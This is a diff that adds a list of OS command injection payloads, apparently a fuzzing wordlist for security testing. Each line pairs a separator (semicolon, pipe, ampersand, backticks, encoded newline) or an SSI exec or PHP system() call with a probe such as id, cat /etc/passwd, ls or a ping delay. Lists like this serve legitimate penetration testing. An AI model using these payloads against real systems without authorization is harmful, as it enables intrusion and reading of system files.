@@ -1,0 +1,64 @@
+$;/usr/bin/id
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0Acat%20/etc/passwd
+%0Aid
+%0Aid%0A
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+& id
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+/index.html|id|
+; id
+;/usr/bin/id\n
+;id
+;id;
+;id\n
+;id|
+;netstat -a;
+;system('/usr/bin/id')
+;system('cat%20/etc/passwd')
+;system('id')
+;|/usr/bin/id|
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="id"-->
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id\n
+\n/usr/bin/id|
+\nid;
+\nid\n
+\nid|
+`/usr/bin/id`
+`id`
+`ping 127.0.0.1`
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
+a;id;
+a;id|
+a|/usr/bin/id
+a|id
+| id
+|/bin/ls -al
+|/usr/bin/id
+|/usr/bin/id|
+|id
+|id;
+|id|
+|nid\n
+|usr/bin/id\n
+||/usr/bin/id;
+||/usr/bin/id|
